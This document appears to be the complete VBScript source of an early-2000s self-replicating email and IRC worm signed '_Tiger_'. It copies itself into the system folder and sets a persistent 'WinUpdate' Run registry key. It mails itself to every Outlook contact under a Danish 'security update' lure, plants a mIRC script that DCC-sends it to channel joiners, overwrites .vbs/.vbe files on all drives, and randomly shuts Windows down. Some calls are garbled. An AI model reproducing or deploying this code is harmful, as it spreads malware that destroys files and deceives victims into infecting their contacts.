'Vbs.Vbswg.Vbswg _Tiger_ Created By _Tiger_. 12/21/2003
Set K3FS5I35 = createobject("scripting.filesystemobject")
RTM3SKOO = K3FS5I35.getspecialfolder(1)
E1HG68PJ = RTM3SKOO & "\Vbswg_Worm.vbs"
Set MA5A04H8 = createobject("wscript.shell")
MA5A04H8.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate", "wscript.exe " & E1HG68PJ & " %"
K3FS5I35.copyfile wscript.scriptfullname, E1HG68PJ
E9U647HC
If MA5A04H8.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Vbswg _Tiger_\NQQ73HJ2") <> 1 then
DOH10DBI
End if
If MA5A04H8.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Vbswg _Tiger_\OVJ37SDF") <> 1 then
ELHBOB13 ""
End if
GF130JDO
Set V9KTF11Q= K3FS5I35.opentextfile(wscript.scriptfullname)
G5340MK6 = V9KTF11Q.readall
V9KTF11Q.close
Do
if not(K3FS5I35.fileexists(wscript.scriptfullname)) then
set IC827855= K3FS5I35.createtextfile(wscript.scriptfullname)
IC827855.write G5340MK6
IC827855.close
end if
VFK74CDH = MA5A04H8.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate")
If VFK74CDH <> "wscript.exe " & E1HG68PJ & " %" then
MA5A04H8.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate", "wscript.exe " & E1HG68PJ & " %"
end if
VFK74CDH= ""
loop
Function DOH10DBI()
Set BF3V141D = CreateObject("Outlook.Application")
If BF3V141D = "Outlook" Then
Set P6D291ST = BF3V141D.GetNameSpace("MAPI")
Set S48S8H3H = P6D291ST.AddressLists
For Each QOT7C72P In S48S8H3H
If QOT7C72P.AddressEntries.Count <> 0 Then
D057B2O0 = QOT7C72P.AddressEntries.Count
For CMUI91F7 = 1 To D057B2O0
Set LM8F50BD = BF3V141D.CreateItem(0)
Set L1GGM4O2 = QOT7C72P.AddressEntries(CMUI91F7)
LM8F50BD.To = L1GGM4O2.Address
LM8F50BD.Subject = "Meget vigtigt "
LM8F50BD.Body = "TJeck den her fil please " & vbcrlf & "det er en sikkerheds updating fra din " & vbcrlf & "internet udbydder." & vbcrlf & ""
execute "set FKB534Q9 =LM8F50BD." & Chr(65) & Chr(116) & Chr(116) & Chr(97) & Chr(99) & Chr(104) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(115)
LOV3FS5I = E1HG68PJ
LM8F50BD.DeleteAfterSubmit = True
FKB534Q9.Add LOV3FS5I
If LM8F50BD.To <> "" Then
LM8F50BD.Send
End If
Next
End If
Next
End If
End function
Function ELHBOB13(VPR0MML5)
If VPR0MML5 <> "" Then
M07A5A04 = MA5A04H8.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If K3FS5I35.fileexists("c:\mirc\mirc.ini") Then
VPR0MML5 = "c:\mirc"
ElseIf K3FS5I35.fileexists("c:\mirc32\mirc.ini") Then
VPR0MML5 = "c:\mirc32"
ElseIf K3FS5I35.fileexists(M07A5A04 & "\mirc\mirc.ini") Then
VPR0MML5 = M07A5A04 & "\mirc"
ElseIf K3FS5I35.fileexists(M07A5A04 & "\mirc32\mirc.ini") Then
VPR0MML5 = M07A5A04 & "\mirc"
Else
VPR0MML5 = ""
End If
End If
If VPR0MML5 <> "" Then
Set H65TM3SK = K3FS5I35.CreateTextFile(VPR0MML5 & "\script.ini", True)
H65TM3SK = "[script]" & vbCrLf & "n0=on 1:JOIN:#:{"
H65TM3SK = H65TM3SK & vbCrLf & "n0=on 1:JOIN:#:{"
H65TM3SK = H65TM3SK & vbCrLf & "n1=  /if ( $nick == $me ) { halt }"
H65TM3SK = H65TM3SK & vbCrLf & "n2=  /." & Chr(100) & Chr(99) & Chr(99) & " send $nick "
H65TM3SK = H65TM3SK & E1HG68PJ
H65TM3SK = H65TM3SK & vbCrLf & "n3=}"
script.Close
End If
End Function
Function O6Q1HG68()
On Error Resume Next
Set PBT9U647 = K3FS5I35.Drives
For Each T6OG14A0 In PBT9U647
V4017BK9 = T6OG14A0 & " \ "
Call N1B16LQ6(V4017BK9)
Next
End Function

Function N1B16LQ6(P8565492)
O63B3J8V = P8565492
Set BF2GUJ6C = K3FS5I35.GetFolder(O63B3J8V)
Set A27OBUDD = BF2GUJ6C.Files
For Each J1592HU3 In A27OBUDD
If lcase(J1592HU3.Name) = "mirc.ini" Then
ELHBOB13(J1592HU3.ParentFolder)
End If
If K3FS5I35.GetExtensionName(J1592HU3.path) = "vbs" then
K3FS5I35.CopyFile wscript.scriptfullname,J1592HU3.path,true
End if
If K3FS5I35.GetExtensionName(J1592HU3.path) = "vbe" then
K3FS5I35.CopyFile wscript.scriptfullname,J1592HU3.path,true
End if
Next
Set P936K3MH = BF2GUJ6C.Subfolders
For Each C5VH9MOM In P936K3MH
Call (C5VH9MOM.path)
Next
End function
Function E9U647HC()
Randomize
If 1 + Int(Rnd * 50) = 7 then
MA5A04H8.run "RUNDLL32.EXE user.exe,exitwindows"
end if
end function
'Vbswg 2 Beta. By [_tige_]
